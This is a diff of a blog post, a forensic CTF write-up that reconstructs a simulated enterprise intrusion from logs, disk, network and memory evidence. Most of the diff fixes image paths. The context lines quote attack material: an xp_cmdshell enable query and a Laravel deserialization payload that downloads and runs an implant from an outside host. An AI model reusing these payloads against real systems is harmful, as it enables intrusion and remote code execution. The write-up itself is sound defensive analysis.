@@ -6,7 +6,7 @@ categories: [CTF, Forensics, DFIR]
 tags: [/assets/heroCTF, ActiveDirectory, DCsync, GLPI, BYOVD]
 ---
 
-About a month ago, I participated in /assets/heroCTF v7 with my team, **CSUI**, where we finished 9th at the end and successfully solved all forensic challenges. I personally handled most of the forensic tracks, which turned out to be some of the most enjoyable and realistic forensic challenges I have experienced in a CTF so far.
+About a month ago, I participated in /heroCTF v7 with my team, **CSUI**, where we finished 9th at the end and successfully solved all forensic challenges. I personally handled most of the forensic tracks, which turned out to be some of the most enjoyable and realistic forensic challenges I have experienced in a CTF so far.
 
 This challenge series is based on real-world engagements, including both penetration testing and red team operations, as stated by the challenge author. This realism is clearly reflected in the attack flow, which closely resembles an actual enterprise intrusion and requires a DFIR-style investigation rather than isolated exploitation steps. In this post, I will share the full forensic write-up of *Operation Pensieve Breach*, covering the complete attack timeline from the initial access and lateral movement to privilege escalation, credential theft, and domain compromise based entirely on evidence extracted from logs, disk artifacts, network traffic, and memory analysis.
 
@@ -45,14 +45,14 @@ For this analysis, Security.evtx was examined as the primary log source, as both
 By analyzing the first DCsync-related Event ID 4662, the account responsible for the malicious replication request can be identified.
 
 From the event details, the following compromised account was observed:
-![alt text](/assets/heroCTF/assets1a.png)
+![alt text](/assets/heroCTF/1a.png)
 This confirms that the account `albus.dumbledore` was used to perform unauthorized directory replication.
 
 ### Attack Start Timestamp
 To determine when the attack began, the earliest DCsync-related Event ID 4662 was examined.
 
 The timestamp used is the SystemTime field, as it represents the authoritative event creation time and is not affected by local time display or synchronization offsets.
-![alt text](/assets/heroCTF/assets1b.png)
+![alt text](/assets/heroCTF/1b.png)
 timestamp : `22/11/2025-23:13:41`
 
 ### Source IP Address Used for the Attack
@@ -60,14 +60,14 @@ Event ID 4662 does not always directly expose the source IP address.
 Therefore, event correlation with Event ID 4624 (Successful Logon) was performed for the same account and timeframe.
 
 By correlating the successful logon event associated with the DCsync activity, the following source IP was identified:
-![alt text](/assets/heroCTF/assets/assets/heroCTF/assets1c.png)
+![alt text](/assets/heroCTF/1c.png)
 IP : `192.168.56.200`
 
 ### Last Legitimate Login IP Before the Attack
 To determine the last legitimate login prior to the compromise, Event ID 4624 entries for the compromised account were analyzed chronologically before the attack timestamp.
 
 The final successful logon before the DCsync activity originated from the following IP address:
-![alt text](/assets/heroCTF/assets1d.png)
+![alt text](/assets/heroCTF/1d.png)
 IP : `192.168.56.230`
 
 FLAG: `Hero{albus.dumbledore;22/11/2025-23:13:41;192.168.56.200;192.168.56.230}
@@ -109,7 +109,7 @@ The file permissions and recent modification timestamp strongly suggest unauthor
 
 Upon reviewing Auth.php, a backdoor was identified.
 The file contains hardcoded cryptographic material used to encrypt user credentials during authentication attempts.
-![alt text](/assets/heroCTF/assets2.png)
+![alt text](/assets/heroCTF/2.png)
 Specifically:   
 - User credentials are encrypted using AES-CBC
 - A hardcoded key and IV are used
@@ -189,7 +189,7 @@ To reconstruct the attack chain, the web server logs were analyzed, focusing on 
 grep "192.168.56.200" *
 ```
 This revealed multiple suspicious requests, including file upload activity and subsequent access to sensitive files.
-![alt text](/assets/heroCTF/assets3.png)
+![alt text](/assets/heroCTF/3.png)
 From the logs, it is evident that the attacker:
 - Uploaded a file named `setup.php`
 - Later accessed `example.gif`, which was previously identified as a file containing encrypted credentials
@@ -328,7 +328,7 @@ When this condition is met, the webshell allows command execution via the follow
 Where `/front/plugin.php` is a legitimate GLPI plugin loader endpoint, SECRET must be the hardcoded value and the command is AES-encrypted, allowing attacker to bypass WAF. Then the encrypted command will be decrypted and executed on the system.
 
 To determine what actions were performed on the system, we could trace the request on the apache logs which containing `submit_form` parameter
-![alt text](/assets/heroCTF/assets3a.png)
+![alt text](/assets/heroCTF/3a.png)
 These requests contain the encrypted payloads passed through the save_result parameter.   
 
 decrypt.py
@@ -388,8 +388,8 @@ docker run -it --rm \
   --innodb_force_recovery=1
 ```
 Once the database engine was running, the contents of the glpi_plugins table were queried.
-![alt text](/assets/heroCTF/assets3c.png)
-![alt text](/assets/heroCTF/assets3d.png)
+![alt text](/assets/heroCTF/3c.png)
+![alt text](/assets/heroCTF/3d.png)
 From the output, a Base64-encoded value was identified in the author field: `YUhlcm97VGhpc19HTFBJX2lzX2Z1bGx5X2JhY2tkb29yZWRfc2FwcmlzdGl9`. Decoding this value results in: : `aHero{This_GLPI_is_fully_backdoored_sapristi}`
 
 At this stage of the investigation, this became one of the most confusing parts.
@@ -397,7 +397,7 @@ Initially, inspecting the glpi_plugins.ibd file directly showed no readable cont
 
 This caused a significant roadblock during the analysis, as the expected evidence seemed to be missing at the filesystem level.
 However, further investigation into MariaDB’s InnoDB storage behavior revealed that this assumption was incorrect.
-![alt text](/assets/heroCTF/assets3b.png)
+![alt text](/assets/heroCTF/3b.png)
 
 This behavior is expected and does not indicate missing data. MariaDB’s InnoDB storage engine does not store table data in a human-readable format.
 Instead, it uses a page-based binary structure, which cannot be meaningfully interpreted using standard filesystem tools.
@@ -411,10 +411,10 @@ This architecture explains why:
 - The data becomes fully visible once interpreted by the MariaDB engine
 
 This behavior is illustrated in the following diagram:
-![alt text](/assets/heroCTF/assets3e.png)(Source: InnoDB Architecture – LinkedIn)
+![alt text](/assets/heroCTF/3e.png)(Source: InnoDB Architecture – LinkedIn)
 
 To further validate that the data was indeed written during a committed transaction, the redo log was inspected:
-![alt text](/assets/heroCTF/assets3f.png)
+![alt text](/assets/heroCTF/3f.png)
 The same Base64-encoded string was found within ib_logfile0, confirming that:
 - The plugin registration was executed
 - The transaction was logged and committed
@@ -425,17 +425,17 @@ From the recovered database, it is confirmed that the attacker registered the ma
 
 ### ID of the CVE used 
 Based on the vulnerability analysis of the exploited GLPI version, the attack aligns with an authenticated RCE vulnerability in GLPI, which was exploited by deploying a PHP webshell through the plugin mechanism.
-![alt text](/assets/heroCTF/assets3i.png)
+![alt text](/assets/heroCTF/3i.png)
 src : https://github.com/glpi-project/glpi/security/advisories/GHSA-cwvp-j887-m4xh
 Answer : `CVE-2024-37149`
 
 ### sAMAccountName used to exploit the application
-![alt text](/assets/heroCTF/assets3g.png)
+![alt text](/assets/heroCTF/3g.png)
 From the glpi_events table, it can be observed that the user neville.longbottom successfully logged into GLPI at:
 - Timestamp: 2025-11-22 23:03:48
 - Source IP: 192.168.56.200   
 
-![alt text](/assets/heroCTF/assets3h.png)
+![alt text](/assets/heroCTF/3h.png)
 Additionally, Apache access logs show that the same IP address (192.168.56.200) initiated the malicious requests used to upload the webshell and interact with the compromised endpoints at 2025-11-22 23:03:49.
 The close temporal proximity between:
 - the successful login of neville.longbottom, and
@@ -481,12 +481,12 @@ The `$MFT` file was dumped into CSV format and filtered based on **file creation
 - dbus.sys (c996d7971c49252c582171d9380360f2
 )
 - ntdll32.exe (c16c588eaf334f2cc658ee3aa36c1d8f)
-![alt text](/assets/heroCTF/assets4.png)
+![alt text](/assets/heroCTF/4.png)
 
 The hashes of these files were extracted and submitted to VirusTotal for further analysis.
-![alt text](/assets/heroCTF/assetsupgrade.png)
-![alt text](/assets/heroCTF/assetsdbus.png)
-![alt text](/assets/heroCTF/assetsntdll32.png)
+![alt text](/assets/heroCTF/upgrade.png)
+![alt text](/assets/heroCTF/dbus.png)
+![alt text](/assets/heroCTF/ntdll32.png)
 
 ### File role analysis
 **1. dbus.sys – Vulnerable binary**
@@ -590,10 +590,10 @@ SELECT *
 FROM dbo.XEL_Trace
 ORDER BY [timestamp];
 ```
-![alt text](/assets/heroCTF/assets5c.png)
-![alt text](/assets/heroCTF/assets5a.png)
-![alt text](/assets/heroCTF/assets5.png)
-![alt text](/assets/heroCTF/assets5b.png)
+![alt text](/assets/heroCTF/5c.png)
+![alt text](/assets/heroCTF/5a.png)
+![alt text](/assets/heroCTF/5.png)
+![alt text](/assets/heroCTF/5b.png)
 From the recovered XEL data, the credential-theft activity targeting Neville can be reconstructed. At 2025-11-22 22:34:22, the attacker executed the following query:
 ```sql
 exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;
@@ -669,12 +669,12 @@ During this analysis, I identified a HTTP frame that was anomalous compared to n
 - The requests consisted only of HTTP headers
 - The packet sizes differed significantly from regular GET requests   
 
-![alt text](/assets/heroCTF/assets6.png)
-![alt text](/assets/heroCTF/assets6a.png)
+![alt text](/assets/heroCTF/6.png)
+![alt text](/assets/heroCTF/6a.png)
 The frame contained multiple cookies, but one cookie stood out due to its unusually large size and encoded structure:`dwULUYdxyze7n8i8qU5UKE8WnVHoa4mIrYwjwcWo=`. This strongly indicated an encrypted Laravel cookie carrying serialized data. To analyze the suspicious cookie, I used  [laravel_crypto_killer](https://github.com/synacktiv/laravel-crypto-killer), a tool designed to decrypt Laravel cookies when the APP_KEY is known.
 
 After decrypting the cookie, the following payload was recovered:
-![alt text](/assets/heroCTF/assets6b.png)
+![alt text](/assets/heroCTF/6b.png)
 ```bash
 5d4711437c28116d0c311af63207e19023b453c8|5d4711437c28116d0c311af63207e19023b453c8|{"data":"O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"\u0000*\u0000events\";O:29:\"Illuminate\\Queue\\QueueManager\":2:{s:6:\"\u0000*\u0000app\";a:1:{s:6:\"config\";a:2:{s:13:\"queue.default\";s:3:\"key\";s:21:\"queue.connections.key\";a:1:{s:6:\"driver\";s:4:\"func\";}}}s:13:\"\u0000*\u0000connectors\";a:1:{s:4:\"func\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:11:\"\u0000*\u0000callback\";s:14:\"call_user_func\";s:10:\"\u0000*\u0000request\";s:6:\"system\";s:11:\"\u0000*\u0000provider\";s:102:\"curl -k https://xthaz.fr/kinit -o /dev/shm/kinit && chmod +x /dev/shm/kinit && /dev/shm/kinit & disown\";}i:1;s:4:\"user\";}}}}","expires":9999999999}
 ```
@@ -728,7 +728,7 @@ To identify the kernel version, the following Volatility plugin was used:
 ```bash
  vol -f spellbook_ram.dump banners
 ```
-![alt text](/assets/heroCTF/assets7.png)
+![alt text](/assets/heroCTF/7.png)
 From the output, two kernel versions were observed:
 - 6.1.0-29-amd64
 - 6.1.0-41-amd64
@@ -773,7 +773,7 @@ Therefore, process enumeration was performed to locate this binary in memory:
 ```bash
 vol -f spellbook_ram.dump linux.pslist | grep 'kinit'
 ```
-![alt text](/assets/heroCTF/assets7a.png)
+![alt text](/assets/heroCTF/7a.png)
 From the output, the running implant process was identified as:
 - PID : `23033`
 - Process Name : `kinit` 
@@ -783,7 +783,7 @@ To identify active network connections associated with the implant, socket infor
 ```bash
 vol -f spellbook_ram.dump linux.sockstat | grep "kinit"
 ```
-![alt text](/assets/heroCTF/assets7b.png)
+![alt text](/assets/heroCTF/7b.png)
 Two local IP addresses were observed:
 - 10.0.2.15
 - 192.168.56.200
@@ -797,15 +797,15 @@ The connection is established over port 53, which is commonly abused by implants
 To identify the authentication secret, the kinit binary was reversed. Initial inspection revealed that kinit was packed using UPX. The binary was first unpacked before reversing. After unpacking, the binary was analyzed using IDA.
 
 Inside the main_main function, a call chain related to session initialization was observed, including a function named `main_createSSHSessionHandler`. During analysis of this logic, a hardcoded credential was passed into a password handler routine.
-![alt text](/assets/heroCTF/assets7c.png)
+![alt text](/assets/heroCTF/7c.png)
 Navigating to the referenced `.rodata` section revealed the following string:
-![alt text](/assets/heroCTF/assets7d.png)
+![alt text](/assets/heroCTF/7d.png)
 This string is clearly used as a static authentication secret during the implant’s connection phase.
 Secret used by the attacker: `?8@XdCNymdoH5CkgigiL`
 
 ### Local username of the attacker on his attacking machine
 Further inspection of the `.rodata` section revealed an additional path string:
-![alt text](/assets/heroCTF/assets7e.png)
+![alt text](/assets/heroCTF/7e.png)
 This strongly indicates that:
 - The implant was compiled on a machine belonging to user `xthaz`
 - The build environment used Go (go1.15) under that user's home directory
@@ -826,4 +826,4 @@ FLAG: `Hero{23033;51.75.120.170;53;?8@XdCNymdoH5CkgigiL;xthaz}`
 
 This challenge was especially enjoyable due to how closely it mirrors a real-world DFIR investigation. Each stage required correlating evidence across multiple data sources, reinforcing the importance of methodical analysis over isolated exploitation techniques.
 
-Huge credit to the challenge author and the /assets/heroCTF team for designing this scenario. 
+Huge credit to the challenge author and the heroCTF team for designing this scenario. 
